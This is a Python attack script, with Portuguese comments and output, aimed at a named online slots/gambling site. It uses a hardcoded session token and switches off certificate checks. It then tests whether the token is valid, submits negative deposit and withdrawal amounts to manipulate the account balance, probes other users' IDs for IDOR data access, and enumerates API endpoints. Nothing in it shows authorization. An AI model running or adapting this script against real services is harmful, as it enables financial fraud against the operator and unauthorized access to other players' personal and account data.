import urllib.request, ssl, json, uuid

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

TOKEN = "137027:1780606100:3001:b3e5ba9da2033d21352bdc872384d052"
BASE  = "https://ds.amizade777.com"
PKG   = "com.slots.big"
DID   = str(uuid.uuid4()).replace("-","")[:32]

def get(path):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept":     "application/json, */*",
        "token":      TOKEN,
        "Origin":     BASE,
        "Referer":    BASE + "/",
    }
    try:
        r = urllib.request.Request(BASE + path, headers=h)
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            return resp.status, json.loads(raw)
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

def post(path, data):
    body = json.dumps(data).encode()
    h = {
        "User-Agent":   "Mozilla/5.0",
        "Content-Type": "application/json",
        "Accept":       "application/json, */*",
        "token":        TOKEN,
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    try:
        r = urllib.request.Request(BASE + path, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            return resp.status, json.loads(raw)
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}
    except Exception as ex:
        return 0, {"err": str(ex)}

print("=" * 60)
print(f"TESTANDO TOKEN NO: {BASE}")
print(f"user_id do token: 137027")
print("=" * 60)

# 1. Verificar token no ds.
print("\n[1] Info do usuário / saldo")
for path in [
    "/japi/user/balance/querySimpleBalance",
    "/prod-api/player/info",
    "/prod-api/player/sign-in",
    "/japi/user/game/getGameList",
]:
    st, body = get(path)
    code = body.get("code","?")
    msg  = body.get("msg","")
    data = body.get("data","")
    flag = " *** TOKEN VÁLIDO ***" if code == 200 else ""
    print(f"  [{st}] {path} -> code={code} msg={msg!r}{flag}")
    if code == 200 and data:
        print(f"    DATA: {json.dumps(data, ensure_ascii=False)[:200]}")

# 2. Depósito com valor negativo
print("\n[2] Teste depósito negativo (ds.)")
for path in [
    "/prod-api/pay-service/recharge",
    "/prod-api/global-config/recharge",
]:
    for amount in [-100, -1, 0]:
        st, body = post(path, {
            "amount": amount,
            "appPackageName": PKG,
            "deviceId": DID,
        })
        code = body.get("code","?")
        msg  = body.get("msg","")
        if st not in (0, 404, 405):
            flag = " *** ACEITO ***" if code == 200 else ""
            print(f"  [{st}] {path} amount={amount} -> code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")

# 3. Saque com valor negativo
print("\n[3] Teste saque negativo (ds.)")
for path in [
    "/prod-api/payment/balance-less",
    "/prod-api/pay-service/withdraw",
]:
    for amount in [-100, -1, 1]:
        st, body = post(path, {
            "amount": amount,
            "appPackageName": PKG,
            "deviceId": DID,
        })
        code = body.get("code","?")
        msg  = body.get("msg","")
        if st not in (0, 404, 405):
            flag = " *** ACEITO ***" if code == 200 else ""
            print(f"  [{st}] {path} amount={amount} -> code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")

# 4. IDOR — acessar outros user_ids
print("\n[4] IDOR no ds.")
for uid in [1, 2, 100, 137026, 137028, 137000]:
    for tmpl in [
        "/prod-api/player/{}",
        "/prod-api/user/{}",
    ]:
        st, body = get(tmpl.format(uid))
        code = body.get("code","?")
        if code == 200:
            print(f"  *** IDOR [{st}] {tmpl.format(uid)}")
            print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")
        elif st not in (0,404,405,403):
            print(f"  [{st}] {tmpl.format(uid)} -> code={code} msg={body.get('msg','')!r}")

# 5. Endpoints da japi que funcionaram
print("\n[5] Endpoints /japi/ no ds.")
for path in [
    "/japi/user/balance/querySimpleBalance",
    "/japi/user/vip/getAllDisplayVo",
    "/japi/user/game/getGameList",
    "/japi/invite/userInvite/getInviteConfig",
    "/japi/invite/userInvite/getUserInviteList",
    "/japi/user/api/signIn/customerSignConfig",
    "/japi/user/api/signIn/signRecord",
]:
    st, body = get(path)
    code = body.get("code","?")
    msg  = body.get("msg","")
    data = body.get("data","")
    flag = " *** OK ***" if code == 200 else ""
    print(f"  [{st}] {path} -> code={code} msg={msg!r}{flag}")
    if code == 200 and data:
        print(f"    DATA: {json.dumps(data, ensure_ascii=False)[:300]}")

print("\nConcluído.")
